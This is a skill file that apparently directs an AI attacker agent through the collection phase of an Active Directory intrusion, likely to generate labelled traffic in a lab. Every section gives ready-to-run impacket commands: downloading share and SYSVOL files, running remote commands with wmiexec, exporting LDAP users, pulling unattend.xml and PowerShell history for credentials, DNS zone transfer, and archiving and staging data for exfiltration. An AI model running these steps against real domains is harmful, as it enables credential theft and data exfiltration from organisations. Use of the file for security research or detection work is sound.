---
name: ad-collection
description: Collection-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers share download, SYSVOL/GPO, LDAP export, unattend and PowerShell history, DNS zone transfer, remote staging, and archiving. Load this skill when the task names ad-collection. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Collection Skill

Load this skill **only** when the dispatched task names `ad-collection`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 4: Collection

## 4.1 Data from Network Shared Drive

- Technique id: `collection.share-download`
- ATT&CK: T1039 (Data from Network Shared Drive)

Purpose: download a sensitive file from an SMB share.

Inputs: a host object with `shares`, a user object with `password` from `users`, and the share name (from `hosts[].shares`). The file path to download is a task-text intent (or discovered by `ls` inside the share).

Procedure (one atomic action — connect, download one file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside the client: `use <share>`, `cd <dir>`, `get <file>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "downloaded from \\\\<host>\\<share>\\<file>"}'
```

Rollback: if the file is gone or the share changed, `mark-stale` the host object and re-run `discovery.share-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.2 Local File Collection
- Technique id: `collection.local-file`
- ATT&CK: T1005 (Data from Local System)

Purpose: enumerate and retrieve files of interest from a compromised host's local filesystem.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action — list via remote shell, then download):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'dir /s /b C:\Users'
```

Then use `smbclient` (`use C$`) to `get` the chosen file.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from <target-ip> <remote-path>"}'
```

Rollback: if a file moves, `mark-stale` the entry and re-run.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 4.3 Archive Collected Data
- Technique id: `collection.archive`
- ATT&CK: T1560 (Archive Collected Data), T1560.001 (Archive via Utility)

Purpose: stage and compress collected files for exfiltration.

Inputs: files already recorded in `files[]` (or staged under `campaign.staging_dir`).

Procedure (one atomic action):

```
tar -cf <campaign.staging_dir>/collected.tar -C <campaign.staging_dir> <files...>
```

or

```
powershell -c "Compress-Archive -Path <campaign.staging_dir>\* -DestinationPath <campaign.staging_dir>\collected.zip"
```

Outputs:

```
python scripts/state.py add files '{"path": "<campaign.staging_dir>/collected.tar", "description": "staged archive of collected data"}'
```

Rollback: re-run after adding or removing staged files.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```


## 4.4 SYSVOL Collection

- Technique id: `collection.sysvol`
- ATT&CK: T1039 (Data from Network Shared Drive)

Purpose: pull files from the domain SYSVOL share on a DC.

Inputs: a user object with `password` from `users`, plus `domain.dc_fqdn` / `domain.dc_ip`.

Procedure (one atomic action — connect, download from SYSVOL, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Inside the client: `use SYSVOL`, `ls`, `get <file>` (or recurse a scripts/GPO path named in the task), `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from \\\\<dc>\\SYSVOL"}'
```

Rollback: if SYSVOL is empty or denied, `mark-stale` and re-run after a working credential.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.5 GPO Preference Files

- Technique id: `collection.gpo-files`
- ATT&CK: T1615 (Group Policy Discovery), T1039 (Data from Network Shared Drive)

Purpose: download Group Policy `Machine/Preferences` XML from SYSVOL (distinct from `credential.gpp-password`, which decrypts cPassword).

Inputs: a user object with `password` from `users`, plus `domain.dc_fqdn`.

Procedure (one atomic action):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Inside the client: `use SYSVOL`, `cd <domain.name>\Policies`, `get` XML under `<GUID>\Machine\Preferences` (or `User\Preferences`) named in the task / listed by `ls`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-xml-path>", "description": "GPO Preferences xml from SYSVOL"}'
```

Rollback: if the GUID path is gone, re-list Policies and retry.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.6 LDAP Directory Export

- Technique id: `collection.ldap-export`
- ATT&CK: T1213 (Data from Information Repositories)

Purpose: export directory user objects over LDAP into a file. This is collection of directory data, not Kerberoasting (`credential.kerberoast`) and not username-only enum (`discovery.user-enum-ldap`).

Inputs: a user object with `password` from `users`, plus `domain.name` and `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetADUsers -all -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Redirect stdout to `ad-users.txt` in `campaign.staging_dir` (if `campaign.staging_dir` is empty, set it to `C:\Windows\Temp\holyfw` with `state.py set`).

Outputs:

```
python scripts/state.py add files '{"path": "<campaign.staging_dir>/ad-users.txt", "description": "LDAP user export"}'
```

Rollback: re-run if the export is truncated or the credential is stale.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 636 || tcp.port == 88)
```


## 4.7 Unattend / Sysprep Files

- Technique id: `collection.unattend`
- ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files)

Purpose: retrieve `unattend.xml` / `sysprep.inf` from a compromised host.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action — `smbclient` `use C$` then `get`):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Try in order: `Windows\Panther\unattend.xml`, `Windows\Panther\Unattend\unattend.xml`, `Windows\System32\sysprep\sysprep.inf`. `get` the first that exists, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "unattend/sysprep from <target-ip>"}'
```

Rollback: if none of the paths exist, record a `notes` entry and mark the technique `failed` (file absent is a valid outcome).

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.8 PowerShell Console History

- Technique id: `collection.ps-history`
- ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files)

Purpose: retrieve `ConsoleHost_history.txt` from a compromised host.

Inputs: a user object with `password` from `users`, plus the target host. Optional: a username whose profile to read (task text or `users[]`).

Procedure (one atomic action):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside: `use C$`, `get Users\<profile>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, `exit`. Discover `<profile>` with `ls Users` if the task does not name one.

Outputs:

```
python scripts/state.py add files '{"path": "ConsoleHost_history.txt", "description": "PowerShell history from <target-ip>"}'
```

Rollback: if the profile has no history file, try another profile or mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.9 DNS Zone Transfer / Enum

- Technique id: `collection.dns-zone`
- ATT&CK: T1071.004 (Application Layer Protocol: DNS), T1046 (Network Service Discovery)

Purpose: attempt a DNS zone transfer (AXFR) against the DC, or enumerate records with `dnscmd` if AXFR is refused.

Inputs: `domain.name`, `domain.dc_ip`. Optional: a user object with `password` for the `dnscmd` fallback.

Procedure (one atomic action):

```
nslookup -type=AXFR <domain.name> <domain.dc_ip>
```

If AXFR is refused and an admin credential is in `users`, fall back to the same technique's remote enum:

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<domain.dc_ip> 'dnscmd /EnumRecords <domain.name> @'
```

Outputs:

```
python scripts/state.py add files '{"path": "dns-zone.txt", "description": "DNS zone/records from <dc-ip>"}'
```

Rollback: re-run if the DC IP is stale.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (dns || udp.port == 53 || tcp.port == 53)) || (ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445))
```


## 4.10 Remote Staging

- Technique id: `collection.remote-stage`
- ATT&CK: T1074.002 (Data Staged: Remote Data Staging)

Purpose: copy already-collected files onto a target share staging directory.

Inputs: at least one path in `files[]` (or under `campaign.staging_dir`), a user object with `password` from `users`, and a host with `shares`. If `campaign.staging_dir` is empty, set it (`C:\Windows\Temp\holyfw`) before the put.

Procedure (one atomic action — connect, `put` one staged file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside: `use <share>`, `put <local-file> <remote-staging-name>`, `exit`. Prefer an existing share from `hosts[].shares` (not SYSVOL write).

Outputs:

```
python scripts/state.py add files '{"path": "<remote-unc>", "description": "staged on \\\\<host>\\<share>"}'
```

Rollback: if the share is read-only, `mark-stale` the share list and re-run `discovery.share-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```

